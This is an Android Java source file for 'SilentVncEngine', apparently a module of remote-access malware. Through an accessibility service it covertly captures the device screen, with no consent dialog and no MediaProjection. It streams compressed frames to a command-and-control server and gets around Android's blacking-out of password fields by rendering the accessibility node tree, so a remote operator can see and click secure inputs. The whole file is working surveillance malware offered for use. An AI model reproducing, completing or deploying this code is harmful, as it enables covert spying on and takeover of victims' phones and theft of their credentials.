package com.seguranca.protecao.hvnc;

import android.graphics.Bitmap;
import android.os.Build;
import android.util.Log;
import android.view.accessibility.AccessibilityNodeInfo;

import androidx.annotation.RequiresApi;

import java.io.ByteArrayOutputStream;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicLong;
import java.util.zip.CRC32;

/**
 * SilentVncEngine — AccessibilityService.takeScreenshot()-based screen capture
 * with NodeTreeRenderer fallback for password fields.
 *
 * No MediaProjection. No user consent dialog. No 10-minute token expiry.
 *
 * Pipeline:
 *   takeScreenshot(callback) [API 30+]
 *     onSuccess → isFrameBlackedOut?
 *       NO  → CRC32 dedup → JPEG encode → WS send
 *       YES → NodeTreeRenderer.render(getRootInActiveWindow())
 *                → JPEG encode → WS send  (operator still sees a usable UI map)
 *     onFailure → backoff
 *
 * Password field handling:
 *   Android intentionally returns a solid-black bitmap from takeScreenshot()
 *   when a password field is focused or a secure window flag is set.
 *   Instead of forwarding a useless black frame, we render the accessibility
 *   node tree as a labelled box diagram. The operator can see and click all
 *   UI elements including the password field (drawn as "●●●●" placeholder).
 *
 * To integrate into CommandControlService / UiAssistBridge:
 *
 *   // In your AccessibilityService subclass:
 *   private SilentVncEngine silentVnc;
 *
 *   // Create once (after WS is connected):
 *   silentVnc = new SilentVncEngine(screenW, screenH, captureW, captureH,
 *                                   this::sendBinaryFrame);
 *
 *   // On START_SILENT_VNC:
 *   silentVnc.start(this);   // 'this' = AccessibilityService
 *
 *   // On STOP_SILENT_VNC:
 *   silentVnc.stop();
 *
 *   // On SET_SILENT_VNC_QUALITY (args.quality):
 *   silentVnc.setQuality(q);
 *
 *   // When WS reconnects, call:
 *   silentVnc.updateSendFn(this::sendBinaryFrame);
 */
@RequiresApi(api = Build.VERSION_CODES.R)   // API 30 for takeScreenshot
public final class SilentVncEngine {

    private static final String TAG = "SilentVnc";

    // ── Timing ─────────────────────────────────────────────────────────────────
    private static final long MIN_DELAY_MS      = 120L;   // ~8 fps baseline
    private static final long MAX_DELAY_MS      = 2000L;
    private static final long STEP_FASTER       = 15L;    // success: speed up
    private static final long STEP_SLOWER       = 120L;   // failure: slow down
    private static final long BLACK_MIN_DELAY   = 200L;   // node-tree render delay

    // ── Frame queue ────────────────────────────────────────────────────────────
    private static final int QUEUE_CAPACITY = 2;

    // ── State ──────────────────────────────────────────────────────────────────
    private volatile boolean     running       = false;
    private volatile long        captureDelayMs = MIN_DELAY_MS;
    private final AtomicBoolean  captureGate   = new AtomicBoolean(false);
    private final AtomicInteger  quality       = new AtomicInteger(50);
    private final AtomicLong     lastCrc       = new AtomicLong(0L);

    // Metrics
    private volatile int framesTotal = 0, framesDropped = 0, framesSkipped = 0, framesNode = 0;

    // ── Dependencies ───────────────────────────────────────────────────────────
    private volatile android.accessibilityservice.AccessibilityService service;
    private volatile FrameSender sendFn;
    private final NodeTreeRenderer nodeRenderer;
    private final int captureW, captureH;

    private Thread              captureThread;
    private ExecutorService     encodePool;
    private ArrayBlockingQueue<Bitmap> encodeQueue;

    public interface FrameSender {
        /** Send raw JPEG bytes to C2. Called from encode thread. */
        void send(byte[] jpeg);
    }

    // ── Constructor ────────────────────────────────────────────────────────────

    public SilentVncEngine(int screenW, int screenH, int captureW, int captureH,
                           FrameSender sendFn) {
        this.captureW    = captureW;
        this.captureH    = captureH;
        this.sendFn      = sendFn;
        this.nodeRenderer = new NodeTreeRenderer(screenW, screenH, captureW, captureH);
    }

    // ── Public API ─────────────────────────────────────────────────────────────

    public synchronized void start(android.accessibilityservice.AccessibilityService svc) {
        if (running) stop();
        this.service = svc;
        running = true;
        lastCrc.set(0L);

        encodeQueue = new ArrayBlockingQueue<>(QUEUE_CAPACITY);
        encodePool  = Executors.newSingleThreadExecutor(r -> {
            Thread t = new Thread(r, "SilentEncode");
            t.setDaemon(true);
            t.setPriority(Thread.NORM_PRIORITY - 1);
            return t;
        });
        encodePool.submit(this::encodeLoop);

        captureThread = new Thread(this::captureLoop, "SilentCapture");
        captureThread.setDaemon(true);
        captureThread.setPriority(android.os.Process.THREAD_PRIORITY_DISPLAY);
        captureThread.start();

        Log.i(TAG, "SilentVnc started " + captureW + "×" + captureH + " Q" + quality.get());
    }

    public synchronized void stop() {
        running = false;
        if (captureThread != null) { captureThread.interrupt(); captureThread = null; }
        if (encodePool   != null) { encodePool.shutdownNow();   encodePool   = null; }
        if (encodeQueue  != null) { encodeQueue.clear();        encodeQueue  = null; }
        captureGate.set(false);
        Log.i(TAG, String.format("SilentVnc stopped — sent=%d dropped=%d skipped=%d node=%d",
                framesTotal, framesDropped, framesSkipped, framesNode));
    }

    public void setQuality(int q) {
        q = Math.max(10, Math.min(100, q));
        quality.set(q);
        // Adjust baseline delay for quality — lower Q = smaller frames = faster ok
        if      (q <= 25) captureDelayMs = 80L;
        else if (q <= 50) captureDelayMs = 120L;
        else if (q <= 75) captureDelayMs = 160L;
        else              captureDelayMs = 220L;
    }

    public void updateSendFn(FrameSender fn) { this.sendFn = fn; }

    public boolean isRunning() { return running; }

    // ── Capture loop ───────────────────────────────────────────────────────────

    private void captureLoop() {
        while (running && !Thread.currentThread().isInterrupted()) {
            try {
                long sleepMs = captureDelayMs;
                Thread.sleep(sleepMs);

                if (!running) break;
                if (!captureGate.compareAndSet(false, true)) { framesDropped++; continue; }

                android.accessibilityservice.AccessibilityService svc = this.service;
                if (svc == null) { captureGate.set(false); continue; }

                svc.takeScreenshot(
                        android.view.Display.DEFAULT_DISPLAY,
                        Executors.newSingleThreadExecutor(),
                        new android.accessibilityservice.AccessibilityService.TakeScreenshotCallback() {
                            @Override
                            public void onSuccess(@androidx.annotation.NonNull
                                                  android.accessibilityservice.AccessibilityService.ScreenshotResult result) {
                                try {
                                    android.hardware.HardwareBuffer hb = result.getHardwareBuffer();
                                    Bitmap raw = Bitmap.wrapHardwareBuffer(hb, null);
                                    hb.close();

                                    if (raw == null) { captureGate.set(false); slowDown(); return; }

                                    // Scale to capture resolution
                                    Bitmap scaled = Bitmap.createScaledBitmap(raw, captureW, captureH, false);
                                    raw.recycle();

                                    if (NodeTreeRenderer.isFrameBlackedOut(scaled)) {
                                        // ── Password-field fallback ──────────
                                        scaled.recycle();
                                        handleBlackedFrame(svc);
                                    } else {
                                        enqueueFrame(scaled);
                                        speedUp();
                                    }
                                } catch (Exception e) {
                                    Log.w(TAG, "onSuccess error: " + e.getMessage());
                                    captureGate.set(false);
                                    slowDown();
                                }
                            }

                            @Override
                            public void onFailure(int errorCode) {
                                captureGate.set(false);
                                slowDown();
                            }
                        }
                );

            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                break;
            } catch (Exception e) {
                Log.w(TAG, "captureLoop error: " + e.getMessage());
                captureGate.set(false);
                slowDown();
            }
        }
    }

    // ── Black-frame fallback (password field / secure window) ─────────────────

    private void handleBlackedFrame(android.accessibilityservice.AccessibilityService svc) {
        try {
            AccessibilityNodeInfo root = svc.getRootInActiveWindow();
            Bitmap nodeFrame = nodeRenderer.render(root);
            if (nodeFrame != null) {
                enqueueFrame(nodeFrame);
                framesNode++;
                captureGate.set(false);
                // Slightly slower cadence for node renders (more expensive)
                try { Thread.sleep(BLACK_MIN_DELAY); } catch (InterruptedException ignored) {}
            } else {
                captureGate.set(false);
            }
        } catch (Exception e) {
            Log.w(TAG, "node render error: " + e.getMessage());
            captureGate.set(false);
        }
    }

    // ── Encode loop ────────────────────────────────────────────────────────────

    private void encodeLoop() {
        while (running && !Thread.currentThread().isInterrupted()) {
            try {
                ArrayBlockingQueue<Bitmap> q = encodeQueue;
                if (q == null) break;
                Bitmap bmp = q.poll(200, TimeUnit.MILLISECONDS);
                if (bmp == null) continue;

                try {
                    byte[] jpeg = encodeJpeg(bmp);
                    if (jpeg != null) {
                        FrameSender fn = sendFn;
                        if (fn != null) fn.send(jpeg);
                        framesTotal++;
                    }
                } finally {
                    bmp.recycle();
                }
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                break;
            } catch (Exception e) {
                Log.w(TAG, "encode error: " + e.getMessage());
            }
        }
    }

    private byte[] encodeJpeg(Bitmap bmp) {
        // CRC32 dedup — skip if screen unchanged
        long crc = crc32(bmp);
        if (crc != 0 && crc == lastCrc.get()) { framesSkipped++; return null; }
        lastCrc.set(crc);

        // Software copy if hardware config (JPEG compress requires software bitmap)
        Bitmap sw = bmp;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O &&
                bmp.getConfig() == Bitmap.Config.HARDWARE) {
            sw = bmp.copy(Bitmap.Config.ARGB_8888, false);
        }

        ByteArrayOutputStream bos = new ByteArrayOutputStream(captureW * captureH / 6);
        sw.compress(Bitmap.CompressFormat.JPEG, quality.get(), bos);
        if (sw != bmp) sw.recycle();
        return bos.toByteArray();
    }

    private static long crc32(Bitmap bmp) {
        try {
            int w = bmp.getWidth(), h = bmp.getHeight();
            // Sample every 4th row to keep it fast
            java.nio.ByteBuffer buf = java.nio.ByteBuffer.allocate(w * 4);
            CRC32 crc = new CRC32();
            for (int y = 0; y < h; y += 4) {
                buf.rewind();
                bmp.copyPixelsToBuffer(buf); // only copies one row at a time in this overload
                crc.update(buf.array());
            }
            return crc.getValue();
        } catch (Exception e) {
            return 0L;
        }
    }

    // ── Frame queue management ─────────────────────────────────────────────────

    private void enqueueFrame(Bitmap bmp) {
        ArrayBlockingQueue<Bitmap> q = encodeQueue;
        if (q == null) { bmp.recycle(); captureGate.set(false); return; }
        if (!q.offer(bmp)) {
            // Queue full — drop oldest, insert newest
            Bitmap old = q.poll();
            if (old != null) { old.recycle(); framesDropped++; }
            q.offer(bmp);
        }
        captureGate.set(false);
    }

    // ── Adaptive pacing ────────────────────────────────────────────────────────

    private void speedUp() {
        captureDelayMs = Math.max(MIN_DELAY_MS, captureDelayMs - STEP_FASTER);
    }

    private void slowDown() {
        captureDelayMs = Math.min(MAX_DELAY_MS, captureDelayMs + STEP_SLOWER);
    }
}
